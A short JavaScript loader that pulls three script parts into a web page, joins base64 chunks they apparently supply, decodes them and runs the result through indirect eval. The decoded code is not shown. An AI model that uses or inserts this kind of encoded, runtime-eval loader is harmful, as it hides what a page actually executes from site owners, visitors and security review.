(function(){
  function load(src, next){
    var s=document.createElement('script');
    s.src=src;
    s.onload=next;
    s.onerror=function(){console.error('fail',src);};
    document.head.appendChild(s);
  }
  var parts = ['js/p0.js?v=2', 'js/p1.js?v=2', 'js/p2.js?v=2'];
  var i=0;
  function next(){
    if(i < parts.length){ load(parts[i++], next); return; }
    (function(){
  var p = window.__MB_P = window.__MB_P || [];
  if (p.length < 3) return;
  var b64 = p.join('');
  var bin = atob(b64);
  var bytes = new Uint8Array(bin.length);
  for (var i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i);
  var text = new TextDecoder('utf-8').decode(bytes);
  (0,eval)(text);
})();

  }
  next();
})();
